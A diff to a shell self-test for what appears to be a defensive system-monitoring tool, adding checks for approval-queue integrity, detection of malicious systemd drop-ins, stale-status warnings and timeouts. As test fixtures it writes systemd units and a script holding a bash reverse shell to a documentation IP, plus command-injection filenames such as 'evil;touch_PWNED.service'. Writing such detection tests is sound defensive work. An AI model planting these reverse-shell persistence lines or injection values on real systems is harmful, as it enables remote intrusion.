@@ -25,12 +25,13 @@ case "$test_root" in /tmp/ccdc-sentry-test.*|"${TMPDIR:-/tmp}"/ccdc-sentry-test.
 cleanup() { rm -rf -- "$test_root"; }
 trap cleanup EXIT INT TERM HUP
 
-mkdir -p "$test_root/suite/lib" "$test_root/state" "$test_root/cron" "$test_root/systemd"
+mkdir -p "$test_root/suite/lib" "$test_root/state" "$test_root/cron" "$test_root/systemd" "$test_root/bin"
 : >"$test_root/null"
 chmod 0666 "$test_root/null"
 cp -- "$ROOT/linux/sentry.sh" "$test_root/suite/sentry.sh"
+cp -- "$ROOT/linux/triage.sh" "$test_root/suite/real-triage.sh"
 cp -- "$ROOT/linux/lib/common.sh" "$test_root/suite/lib/common.sh"
-chmod 0755 "$test_root/suite/sentry.sh"
+chmod 0755 "$test_root/suite/sentry.sh" "$test_root/suite/real-triage.sh"
 
 cat >"$test_root/suite/triage.sh" <<'FAKE_TRIAGE'
 #!/usr/bin/env bash
@@ -50,6 +51,17 @@ case "$mode" in
   unit)
     printf 'RED|unit|/etc/systemd/system/evil.service|test unit\n' >"$out"
     ;;
+  reviewed_one)
+    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item\n' >"$out"
+    ;;
+  reordered)
+    printf 'RED|cron|/etc/cron.d/unreviewed-new|new item inserted first\n' >"$out"
+    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item moved to position two\n' >>"$out"
+    ;;
+  dropins)
+    printf 'RED|unitdropin|scored.service::/etc/systemd/system/scored.service.d/direct.conf|direct malicious drop-in\n' >"$out"
+    printf 'RED|unitdropindeep|scored.service::/etc/systemd/system/scored.service.d/deep.conf::%s/deep-payload.sh|deep malicious drop-in\n' "$CCDC_TEST_ROOT" >>"$out"
+    ;;
   clean)
     : >"$out"
     ;;
@@ -65,9 +77,19 @@ FAKE_TRIAGE
 
 cat >"$test_root/suite/watch.sh" <<'FAKE_WATCH'
 #!/usr/bin/env bash
+[ -n "${CCDC_TEST_ROOT:-}" ] && printf 'watch ran\n' >>"$CCDC_TEST_ROOT/watch-runs"
 exit 0
 FAKE_WATCH
 chmod 0755 "$test_root/suite/triage.sh" "$test_root/suite/watch.sh"
+
+cat >"$test_root/bin/timeout" <<'FAKE_TIMEOUT'
+#!/usr/bin/env bash
+limit=$1
+shift
+[ -n "${CCDC_TEST_ROOT:-}" ] && printf '%s|%s\n' "$limit" "${1##*/}" >>"$CCDC_TEST_ROOT/timeout-calls"
+exec "$@"
+FAKE_TIMEOUT
+chmod 0755 "$test_root/bin/timeout"
 
 cat >"$test_root/runner.sh" <<'RUNNER'
 #!/usr/bin/env bash
@@ -76,6 +98,8 @@ test_root=$1
 suite="$test_root/suite"
 state="$test_root/state"
 config="$test_root/test.env"
+PATH="$test_root/bin:$PATH"
+export PATH
 pass=0
 fail=0
 ok() { pass=$((pass + 1)); printf 'ok %s - %s\n' "$pass" "$1"; }
@@ -103,6 +127,7 @@ cd "$test_root" || exit 1
 "$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
 has '^RED[|]cron[|]/etc/cron.d/job;touch[$][{]IFS[}]PWNED$' "$state/sentry.queue" \
   'queue stores structured fields, not a command'
+"$suite/sentry.sh" --config "$config" --status >/dev/null
 if "$suite/sentry.sh" --config "$config" --approve --apply >/dev/null; then
   ok 'metacharacter-path approval completed'
 else
@@ -121,6 +146,7 @@ write_config ssh
 "$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
 has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
   'unprotected current unit queued'
+"$suite/sentry.sh" --config "$config" --status >/dev/null
 write_config 'ssh evil.service'
 if "$suite/sentry.sh" --config "$config" --approve --apply >"$test_root/stale.out"; then
   ok 'approval refresh accepted changed protection config'
@@ -139,12 +165,72 @@ printf 'unit\n' >"$test_root/mode"
 has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
   'disappeared finding queues again when it returns'
 
+# Numeric approval is bound to what --status showed, not to a freshly
+# re-numbered queue. Insert a new item ahead of reviewed item 1 before approve.
+printf 'old\n' >'/etc/cron.d/reviewed-old'
+printf 'new\n' >'/etc/cron.d/unreviewed-new'
+printf 'reviewed_one\n' >"$test_root/mode"
+"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
+"$suite/sentry.sh" --config "$config" --status >"$test_root/reviewed.out"
+has 'Reviewed approval snapshot frozen' "$test_root/reviewed.out" \
+  'status freezes the queue identity the operator reviewed'
+printf 'reordered\n' >"$test_root/mode"
+if "$suite/sentry.sh" --config "$config" --approve 1 --apply >/dev/null; then
+  ok 'approval survives live queue reordering'
+else
+  bad 'approval survives live queue reordering'
+fi
+[ ! -e /etc/cron.d/reviewed-old ] && ok 'approved identity was removed' || bad 'approved identity was removed'
+[ -e /etc/cron.d/unreviewed-new ] && ok 'new unreviewed item was not substituted' || bad 'new unreviewed item was not substituted'
+
+# A protected/scored service must protect its legitimate unit, not an injected
+# drop-in attached to it. Exercise both direct malicious content and a clean
+# drop-in that points one hop down to the payload.
+mkdir -p /etc/systemd/system/scored.service.d
+printf '[Service]\nExecStartPost=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
+  >/etc/systemd/system/scored.service.d/direct.conf
+printf '[Service]\nExecStartPost=%s/deep-payload.sh\n' "$test_root" \
+  >/etc/systemd/system/scored.service.d/deep.conf
+printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' >"$test_root/deep-payload.sh"
+chmod 0755 "$test_root/deep-payload.sh"
+printf '[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
+  >'/etc/systemd/system/evil;touch_PWNED.service'
+write_config 'ssh scored.service'
+"$suite/real-triage.sh" --config "$config" --quiet \
+  --findings-file "$state/dropin.findings" >"$test_root/real-triage.out" || triage_rc=$?
+[ "${triage_rc:-0}" -eq 3 ] && ok 'real triage reports malicious drop-ins' || bad 'real triage reports malicious drop-ins'
+has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf[|]' \
+  "$state/dropin.findings" 'direct drop-in gets its own machine finding'
+has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh[|]' \
+  "$state/dropin.findings" 'clean drop-in is followed one hop to its payload'
+has 'evil\\;touch_PWNED.service' "$test_root/real-triage.out" \
+  'paste-ready unit commands shell-quote an attacker-controlled filename'
+printf 'dropins\n' >"$test_root/mode"
+"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
+has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf$' \
+  "$state/sentry.queue" 'scored unit protection does not shield a malicious drop-in'
+has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh$' \
+  "$state/sentry.queue" 'deep drop-in remediation reaches the approval queue'
+
+# A dead supervisor must not leave an old calm-looking ALERTS file as the only
+# output of --status. Age the completion marker and require a loud warning.
+touch -t 200001010000 "$state/sentry.last-pass"
+"$suite/sentry.sh" --config "$config" --status >"$test_root/stale-status.out"
+has '^WARNING: last sentry pass is .* old' "$test_root/stale-status.out" \
+  'status calls out a stale supervisor report'
+
 # Detector failure must clear actions and become an explicit health alarm.
 printf 'fail\n' >"$test_root/mode"
+rm -f "$state/sentry.watch.last"
+watch_before=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
 "$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
 [ ! -s "$state/sentry.queue" ] && ok 'triage failure clears actionable queue' || bad 'triage failure clears actionable queue'
 has 'MONITOR HEALTH PROBLEM' "$state/ALERTS" 'triage failure is visible in ALERTS'
 has 'exit 9' "$state/sentry.health.triage" 'triage failure records exit status'
+watch_after=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
+[ "$watch_after" -gt "$watch_before" ] && ok 'triage failure does not suppress the independent watch layer' || bad 'triage failure does not suppress the independent watch layer'
+has '^45[|]triage.sh$' "$test_root/timeout-calls" 'triage runs behind its configured deadline'
+has '^90[|]watch.sh$' "$test_root/timeout-calls" 'watch runs behind its configured deadline'
 
 printf 'sentry self-test: %s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
